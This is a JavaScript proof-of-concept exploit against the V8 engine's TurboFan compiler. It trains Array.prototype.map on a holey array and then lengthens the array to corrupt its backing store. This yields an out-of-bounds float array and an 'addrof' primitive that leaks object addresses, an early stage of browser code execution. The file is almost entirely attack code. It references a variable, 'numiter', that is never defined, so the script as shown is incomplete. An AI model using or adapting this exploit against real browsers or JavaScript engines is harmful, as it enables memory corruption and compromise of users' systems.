
function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); }};
let f64 = new Float64Array(1);
let u32 = new Uint32Array(f64.buffer);
function d2u(v) {
  f64[0] = v;
  return u32;
}
function u2d(lo, hi) {
  u32[0] = lo;
  u32[1] = hi;
  return f64[0];
}
function hex(lo, hi) {
  if( lo == 0 ) {
    return ("0x" + hi.toString(16) + "00000000");
  }
  if( hi == 0 ) {
    return ("0x" + lo.toString(16));
  }
  return ("0x" + ('00000000'+hi.toString(16)).substr(8) +('00000000'+lo.toString(16)).substr(8));
}

const SIZE = 32 * 1024 * 1024;
// This call ensures that TurboFan won't inline array constructors.
Array(2**30);
// Set up a fast holey smi array, and generate optimized code.
let arr = [1, 2, ,,, 3];

// global
let targetArray = null; 
let leakarray = null;
let obj = null;

let targetBuffer = null;
let bufferidx = null;
let bufferbackup = null;
let leakidx = null;
function func(v,idx) {
  if (idx > numiter) {
    throw "err";
  } else if (idx == 0) {
    targetArray = [1.1, 1.2, 1.3, 1.4, 1.5];
    leakarray = [0x4141,0x4242, {}];
    //leakarray = new BigUint64Array(2);
    //leakarray[0] = 0x41414141n;
    //leakarray[1] = 0x42424242n;
    //obj = {'a': 0x31323334, 'b': 1};
    //obj['b'] = obj;
  }
  return v;
}
function mapping(a) {
  return a.map(func);
}
for(let i = 0; i < 100000; i++){
  mapping(arr);
}
// Now lengthen the array, but ensure that it points to a non-dictionary
// backing store.
arr.length = SIZE-1;
//arr.fill(1,0);
arr.fill(1, numiter, numiter+1);
arr.fill(1, numiter+2);
arr.push(2);
arr.length += 500;
// Now, the non-inlined array constructor should produce an array with
// dictionary elements: causing a crash.
// readline();
try{
  gc();
  mapping(arr);
} catch {};
if (targetArray.length == 0x1ff80000 || targetArray.length == 0x3ff00000) {
  //print("success");
} else {
  print("fail" + targetArray.length);
  if (targetArray.length == 5)
    throw "fail";
}

/*
let start = 0x1ff80000 / 8;
//let start = 0x10000000;
for (let i = start; i < start + 100; i++) {
  print("target " + i);
  print("targetarr " + targetArray[i]);
  //print("targetarr " + typeof(targetArray[i]));
}
*/

if (targetArray[18] == u2d(0,0x4141)) {
  print("leak success");
} else {
  print("leak fail");
}
if(targetArray[19] == u2d(0,0x4242)){
 //print("leak success");
} else {
  print("leak fail");
}
if(targetArray[28] == u2d(0,0x31323334)){
  //print("obj success");
} else {
  print("obj fail");
}

let addrof = function(obj){
  leakarray[0] = obj;
  return d2u(targetArray[18]);
};
print("success");
var addrobject = addrof(Object);
print("addrof " + hex(addrobject[0], addrobject[1]));

//let original_elements_ptr = float_array[tarray_elements_len_offset+1].f2i() - 1n;
//print('original elements addr: ' + original_elements_ptr.toString(16));

